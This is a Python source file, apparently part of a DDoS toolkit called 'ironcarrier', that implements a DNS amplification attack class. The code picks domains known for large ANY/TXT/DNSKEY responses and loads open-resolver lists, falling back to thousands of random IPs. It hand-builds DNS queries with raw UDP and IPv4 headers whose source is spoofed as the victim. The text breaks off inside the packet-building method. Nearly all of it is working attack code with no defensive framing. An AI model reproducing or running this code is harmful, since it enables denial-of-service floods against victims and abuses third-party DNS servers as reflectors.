#!/usr/bin/env python3
"""
DNS Amplification Vector
Exploits open DNS resolvers for amplification attacks
"""

import socket
import struct
import random
import time
import threading
from typing import Optional, List
from ironcarrier.core.stats import StatsCollector


class Attack:
    """DNS amplification attack vector"""
    
    # Popular domains with large TXT/ANY responses
    AMPLIFICATION_QUERIES = [
        ('isc.org', 'TXT'),
        ('ripe.net', 'TXT'),
        ('sns-pb.isc.org', 'ANY'),
        ('pfam.org', 'ANY'),
        ('dnsamplificationtest.com', 'ANY'),
        ('google.com', 'DNSKEY'),
        ('isc.org', 'DNSKEY'),
        ('ripe.net', 'SOA'),
        ('example.com', 'ANY'),
    ]
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 50, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port  # Destination port on target (usually same as source)
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.reflectors: List[str] = []
        self.spoof_ip = kwargs.get('spoof_ip', True)
        self.reflector_file = kwargs.get('reflector_file', None)
        self.query_type = kwargs.get('query_type', 'ANY')
        self.dns_port = kwargs.get('dns_port', 53)
        self._load_reflectors()
    
    def _load_reflectors(self) -> None:
        """Load reflector list from file or generate random"""
        if self.reflector_file:
            try:
                with open(self.reflector_file, 'r') as f:
                    self.reflectors = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            except FileNotFoundError:
                pass
        
        if not self.reflectors:
            # Generate random IPs as fallback
            for _ in range(10000):
                ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                self.reflectors.append(ip)
    
    def _build_dns_query(self, domain: str, qtype: str, txid: int) -> bytes:
        """Build DNS query packet"""
        type_map = {
            'A': 1, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'MX': 15,
            'TXT': 16, 'AAAA': 28, 'DNSKEY': 48, 'ANY': 255
        }
        
        # DNS Header
        header = struct.pack(
            '!HHHHHH',
            txid,           # Transaction ID
            0x0100,         # Flags: Standard query, Recursion Desired
            1,              # Questions
            0,              # Answers
            0,              # Authority
            0               # Additional
        )
        
        # QNAME - encode domain name
        qname = b''
        for label in domain.split('.'):
            qname += bytes([len(label)]) + label.encode()
        qname += b'\x00'
        
        # QTYPE and QCLASS
        question = qname + struct.pack('!HH', type_map.get(qtype, 255), 1)  # IN class
        
        return header + question
    
    def _build_ip_header(self, src_ip: str, dst_ip: str, payload_len: int) -> bytes:
        """Build IPv4 header with spoofed source"""
        total_length = 20 + payload_len
        return struct.pack(
            '!BBHHHBBH4s4s',
            0x45,               # Version + IHL
            0,                  # TOS
            total_length,       # Total Length
            random.randint(0, 65535),  # Identification
            0x4000,             # Don't Fragment
            64,                 # TTL
            17,                 # Protocol UDP
            0,                  # Checksum (0 for raw)
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip)
        )
    
    def _build_udp_header(self, src_port: int, dst_port: int, payload_len: int) -> bytes:
        """Build UDP header"""
        return struct.pack('!HHHH', src_port, dst_port, 8 + payload_len, 0)
    
    def _build_packet(self) -> bytes:
        """Build complete DNS amplification packet"""
        reflector = random.choice(self.reflectors)
        domain, qtype = random.choice(self.AMPLIFICATION_QUERIES)
        if self.query_type != 'ANY':
            qtype = self.query_type
        
        txid = random.randint(0, 65535)
        src_port = random.randint(1024, 65535)
        
        dns_payload = self._build_dns_query(domain, qtype, txid)
        udp_header = self._build_udp_header(src_port, self.dns_port, len(dns_payload))
